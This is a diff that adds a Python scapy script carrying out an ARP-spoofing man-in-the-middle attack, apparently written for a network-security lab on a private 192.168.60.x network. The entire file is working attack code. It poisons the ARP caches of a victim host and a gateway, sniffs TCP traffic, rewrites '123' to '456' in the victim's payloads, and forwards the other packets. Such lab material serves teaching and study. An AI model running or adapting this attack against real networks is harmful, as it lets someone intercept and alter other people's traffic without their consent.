@@ -1,0 +1,94 @@
+#!/usr/bin/python3
+from scapy.all import *
+import re
+
+# 主机A(受害者)的信息
+IP_A = "192.168.60.2"
+MAC_A = "02:42:c0:a8:3c:02"
+
+# 主机B(网关)的信息
+IP_B = "192.168.60.1"
+MAC_B = "02:42:2c:ca:47:a4" #注意MAC是否正确
+
+# 攻击者M的信息
+IP_M = "192.168.60.3"
+MAC_M = "02:42:c0:a8:3c:03"
+
+def arp_spoof():
+    """持续发送伪造的ARP响应"""
+    print("Starting ARP spoofing...")
+    # 构造欺骗A的ARP包(声称B的IP对应M的MAC)
+    pkt_to_A = Ether(src=MAC_M, dst=MAC_A)/ \
+               ARP(op=2, psrc=IP_B, hwsrc=MAC_M, pdst=IP_A)
+    
+    # 构造欺骗B的ARP包(声称A的IP对应M的MAC)
+    pkt_to_B = Ether(src=MAC_M, dst=MAC_B)/ \
+               ARP(op=2, psrc=IP_A, hwsrc=MAC_M, pdst=IP_B)
+    
+    while True:
+        sendp(pkt_to_A, verbose=0, iface="eth0")
+        sendp(pkt_to_B, verbose=0, iface="eth0")
+        time.sleep(1)
+
+def packet_handler(pkt):
+    """处理捕获的数据包"""
+    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
+        # 从A到B的数据包
+        if pkt[Ether].src == MAC_A and pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
+            try:
+                original_data = pkt[Raw].load.decode('utf-8', errors='ignore')
+                print(f"Original data from A to B: {original_data}")
+                
+                # 修改"123"为"456"
+                modified_data = original_data.replace('123', '456')
+                
+                if modified_data != original_data:
+                    print(f"Modified data: {modified_data}")
+                    
+                    # 构造新数据包
+                    new_pkt = Ether(src=MAC_M, dst=MAC_B)/ \
+                              IP(src=IP_A, dst=IP_B)/ \
+                              TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, 
+                                  seq=pkt[TCP].seq, ack=pkt[TCP].ack, 
+                                  flags=pkt[TCP].flags)/ \
+                              modified_data
+                    
+                    sendp(new_pkt, iface="eth0")
+                else:
+                    # 没有需要修改的内容，直接转发
+                    pkt[Ether].src = MAC_M
+                    pkt[Ether].dst = MAC_B
+                    del pkt[IP].chksum
+                    del pkt[TCP].chksum
+                    sendp(pkt, iface="eth0")
+            
+            except Exception as e:
+                print(f"Error processing packet: {e}")
+        
+        # 从B到A的数据包 - 直接转发
+        elif pkt[Ether].src == MAC_B and pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
+            pkt[Ether].src = MAC_M
+            pkt[Ether].dst = MAC_A
+            del pkt[IP].chksum
+            del pkt[TCP].chksum
+            sendp(pkt, iface="eth0")
+
+if __name__ == "__main__":
+    import threading
+    
+    # 开启ARP欺骗线程
+    arp_thread = threading.Thread(target=arp_spoof, daemon=True)
+    arp_thread.start()
+    
+    # 设置IP转发(实验前手动开启)
+    # 这里不自动开启是因为实验要求手动操作
+    
+    # 设置嗅探过滤器
+    packet_filter = f"tcp and (ether src {MAC_A} or ether src {MAC_B})"
+    
+    print("Starting MITM attack...")
+    print("Make sure to manually enable IP forwarding first!")
+    print("Waiting for packets to modify...")
+    
+    # 开始嗅探和处理数据包
+    sniff(filter=packet_filter, prn=packet_handler, iface="eth0")
